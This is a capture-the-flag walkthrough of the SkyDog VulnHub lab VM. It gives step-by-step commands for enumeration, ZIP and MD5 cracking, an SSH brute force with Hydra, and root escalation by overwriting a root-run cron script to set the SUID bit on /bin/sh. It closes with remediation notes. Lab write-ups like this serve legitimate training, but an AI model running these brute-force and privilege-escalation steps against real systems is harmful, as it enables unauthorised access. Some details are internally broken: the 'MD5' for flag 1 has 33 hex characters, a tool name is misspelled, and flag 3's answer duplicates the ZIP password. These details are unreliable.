# SkyDog: CTF Walkthrough

**Target:** SkyDog VM by James Bower  
**Difficulty:** Beginner-Intermediate  
**Flags:** 6 (all MD5, require cracking)  
**Source:** [VulnHub](https://www.vulnhub.com/entry/skydog-1,159/)

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ATTACK FLOW DIAGRAM                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  [Flag 1] ExifTool ──► Download image ──► Extract MD5 from EXIF    │
│       │                                      │                      │
│       │                                 crack ──► "Welcome Home"    │
│       ▼                                                            │
│  [Flag 2] robots.txt ──► Find MD5 ──► crack ──► "Bots"             │
│       │                                                            │
│       ▼                                                            │
│  [Flag 3] /Setec/Astronomy ──► whistler.zip ──► crack password     │
│       │                                     │                      │
│       │                                unzip ──► flag.txt           │
│       │                                     │                      │
│       │                                crack ──► "yourmother"      │
│       ▼                                                            │
│  [Flag 4] CeWL from IMDB ──► dirb ──► PlayTronics ──► flag.txt    │
│       │                                         │                  │
│       │                                    crack ──► "leroybrown"  │
│       ▼                                                            │
│  [Flag 5] PlayTronics ──► .pcap ──► Wireshark ──► audio ──► SSH   │
│       │                         extract        "werner brandes"     │
│       │                                    crack ──► "Dr. Gunter"  │
│       ▼                                                            │
│  [Flag 6] cron ──► writable script ──► code injection ──► root     │
│                                     /lib/log/sanitizer.py    │     │
│                                                    crack ──► Done  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 1. Reconnaissance

Identify the target and enumerate open services.

```bash
# Discover target on the network
netdiscover -r 192.168.1.0/24
```

| IP Address | MAC Address | Vendor |
|------------|-------------|--------|
| 192.168.1.102 | 08:00:27:XX:XX:XX | Oracle VirtualBox |

```bash
# Full service and version scan
nmap -A -p- 192.168.1.102
```

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22 | open | SSH | OpenSSH 6.6.1p1 |
| 80 | open | HTTP | Apache 2.4.7 (Ubuntu) |

---

## 2. Flag #1: "Home Sweet Home" (ExifTool)

Browse the web server and extract metadata from the hero image.

```bash
# Browse the site
firefox http://192.168.1.102
```

The homepage displays an image of the SkyDogCon CTF event. Save the image.

```bash
# Download the image
wget http://192.168.1.102/SkyDogCon_CTF.jpg

# Extract EXIF metadata: the Comment field contains an MD5 hash
exiftool SkyDogCon_CTF.jpg
```

```
ExifTool Version Number         : 12.76
File Name                       : SkyDogCon_CTF.jpg
Comment                         : flag{abc40a2d4e023b42bd1ff048914549ae2}
```

```bash
# Crack the MD5 hash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# or
hash-identifier
```

| Hash | Cracked Value |
|------|---------------|
| `abc40a2d4e023b42bd1ff048914549ae2` | **Welcome Home** |

**Flag #1: Welcome Home**

---

## 3. Flag #2: "When do Androids Learn to Walk?" (robots.txt)

Enumerate `robots.txt` for hidden directories and the next flag.

```bash
# Check robots.txt
curl http://192.168.1.102/robots.txt
```

The file contains **15 allowed entries** and **252 disallowed entries**. Among the disallowed paths, an MD5 hash is embedded as a comment or direct flag.

```
User-agent: *
Disallow: /Flag4isnotCheese
...
flag{cd4f10fcba234f0e8b2f60a490c306e6}
```

```bash
# Crack the MD5 hash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

| Hash | Cracked Value |
|------|---------------|
| `cd4f10fcba234f0e8b2f60a490c306e6` | **Bots** |

**Flag #2: Bots**

---

## 4. Flag #3: "Who Can You Trust?" (whistler.zip)

Explore directories listed in `robots.txt` to find a password-protected ZIP.

```bash
# Browse allowed directories from robots.txt: one stands out
curl -v http://192.168.1.102/Setec
```

The page title is **"Too many secrets"** (a *Sneakers* movie reference).

```bash
# Discover subdirectory
curl -v http://192.168.1.102/Setec/Astronomy
```

Download the ZIP file found at `/Setec/Astronomy`:

```bash
wget http://192.168.1.102/Setec/Astronomy/whistler.zip
```

```bash
# Crack the ZIP password using rockyou.txt
fackzip -vuD -p /usr/share/wordlists/rockyou.txt whistler.zip
```

```
PASSWORD FOUND!!!!: pw == yourmother
```

```bash
# Extract contents
unzip whistler.zip
```

| File | Contents |
|------|----------|
| `flag.txt` | MD5 hash to crack |
| `QuesttoFindCosmo.txt` | Hint about OSINT + *Sneakers* movie: points toward IMDB research |

```bash
# Crack the MD5 from flag.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

| Hash | Cracked Value |
|------|---------------|
| `1871a3c1da602bf471d3d76cc60cdb9b` | **yourmother** |

**Flag #3: yourmother**

---

## 5. Flag #4: "Who Doesn't Love a Good Cocktail Party?" (CeWL + PlayTronics)

Use OSINT to build a custom wordlist, then brute-force hidden directories.

The `QuesttoFindCosmo.txt` references the *Sneakers* movie. Use **CeWL** to scrape a wordlist from the IMDB trivia page:

```bash
# Generate wordlist from IMDB Sneakers trivia page
cewl --depth 1 https://www.imdb.com/title/tt0105435/trivia -w /root/Desktop/dict.txt
```

```bash
# Brute-force directories with the custom wordlist
dirb http://192.168.1.102/ dict.txt
```

`dirb` discovers the **PlayTronics** directory.

```bash
# Browse and download
wget http://192.168.1.102/PlayTronics/flag.txt
```

```bash
# Crack the MD5 hash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

| Hash | Cracked Value |
|------|---------------|
| `c07908a705c22922e6d416e0e1107d99` | **leroybrown** |

**Flag #4: leroybrown**

---

## 6. Flag #5: "Another Day at the Office" (SSH Brute Force)

The PlayTronics directory also contains a `.pcap` network capture file.

```bash
# Download the pcap
wget http://192.168.1.102/PlayTronics/network-traffic.pcap
```

Open in Wireshark and extract the embedded audio file:

```bash
# Extract audio objects from pcap
binwalk -e network-traffic.pcap
# or use Wireshark: File → Export Objects → HTTP → save audio file
```

Playing the audio reveals the voice saying: **"werner brandes"**

```bash
# Build dictionaries from gathered intel
# Usernames: wernerbrandes, werner, brandes, etc.
# Passwords: welcome, home, bots, yourmother, leroybrown, etc.

echo -e "wernerbrandes\nwerner\nbrandes" > users.txt
echo -e "welcome\nhome\nbots\nyourmother\nleroybrown" > passwords.txt

# SSH brute force with Hydra
hydra -v -L users.txt -P passwords.txt 192.168.1.102 ssh
```

```
[22][ssh] host: 192.168.1.102   login: wernerbrandes   password: leroybrown
```

```bash
# SSH into the box
ssh wernerbrandes@192.168.1.102
# password: leroybrown

# Find and read the flag
find / -name "flag.txt" 2>/dev/null
cat /home/wernerbrandes/flag.txt
```

```bash
# Crack the MD5 hash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

| Hash | Cracked Value |
|------|---------------|
| `82ce8d8f5745ff6849fa7af1473c9b35` | **Dr. Gunter Janek** |

**Flag #5: Dr. Gunter Janek**

---

## 7. Flag #6: "Little Black Box" (Writable File Privesc)

Escalate to root by injecting code into a writable cron script.

```bash
# Find writable files
find / -writable -type f 2>/dev/null
```

Suspicious path found: `/lib/log/sanitizer.py`: a cron script that runs as root.

```bash
cat /lib/log/sanitizer.py
```

```python
import os
import sys

# Sanitize temp directory
os.system('rm -r /tmp/*')
```

```bash
# Inject privilege escalation payload
nano /lib/log/sanitizer.py
```

Replace the contents with:

```python
import os
import sys

# Sanitize temp directory
os.system('chmod u+s /bin/sh')
```

```bash
# Wait for cron to execute (check crontab for interval)
# Once executed, the SUID bit is set on /bin/sh

# Verify and escalate
/bin/sh
id
# uid=0(root) gid=0(root) groups=0(root)
```

```bash
# Retrieve the final flag
cd /BlackBox
cat flag.txt
```

```bash
# Crack the MD5 hash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

| Hash | Cracked Value |
|------|---------------|
| `b70b205c96270be6ced772112e7dd03f` | **CongratulationsYouDidIt** |

**Flag #6: CongratulationsYouDidIt**

---

## Flags Summary

| # | Challenge Name | Source | MD5 Hash | Cracked Value |
|---|----------------|--------|----------|---------------|
| 1 | Home Sweet Home | ExifTool on SkyDogCon_CTF.jpg | `abc40a2d4e023b42bd1ff048914549ae2` | Welcome Home |
| 2 | When do Androids Learn to Walk? | robots.txt | `cd4f10fcba234f0e8b2f60a490c306e6` | Bots |
| 3 | Who Can You Trust? | whistler.zip (password: yourmother) | `1871a3c1da602bf471d3d76cc60cdb9b` | yourmother |
| 4 | Who Doesn't Love a Good Cocktail Party? | CeWL → PlayTronics/flag.txt | `c07908a705c22922e6d416e0e1107d99` | leroybrown |
| 5 | Another Day at the Office | SSH (wernerbrandes:leroybrown) | `82ce8d8f5745ff6849fa7af1473c9b35` | Dr. Gunter Janek |
| 6 | Little Black Box | Writable cron script → root | `b70b205c96270be6ced772112e7dd03f` | CongratulationsYouDidIt |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `netdiscover` | Network host discovery |
| `nmap` | Port scanning and service enumeration |
| `exiftool` | EXIF metadata extraction from images |
| `hashcat` | Offline MD5 hash cracking |
| `curl` | HTTP request inspection |
| `fackzip` / `fcrackzip` | ZIP password brute forcing |
| `cewl` | Custom wordlist generation from web content |
| `dirb` | Directory and file brute forcing |
| `Wireshark` | PCAP analysis and object extraction |
| `binwalk` | Binary file extraction |
| `Hydra` | SSH brute force authentication |
| `nano` | File editing for privilege escalation |

---

## Remediation Notes

| Vulnerability | Remediation |
|---------------|-------------|
| Sensitive data in image EXIF metadata | Remove comments/metadata from images before deployment |
| Information disclosure via robots.txt | Minimize disallowed paths; do not embed sensitive data |
| Weak ZIP password protection | Use strong passwords; avoid dictionary-vulnerable passphrases |
| .pcap files left on production web servers | Remove packet captures and debug artifacts from production |
| Writable system scripts in cron jobs | Enforce least-privilege file permissions; audit cron jobs regularly |
| Weak SSH credentials | Enforce strong password policies; implement key-based auth |
| Writable cron scripts enabling code injection | Set strict ownership (`root:root`) and permissions (`0755`) on all cron scripts |

---

*Walkthrough completed. 6/6 flags captured.*
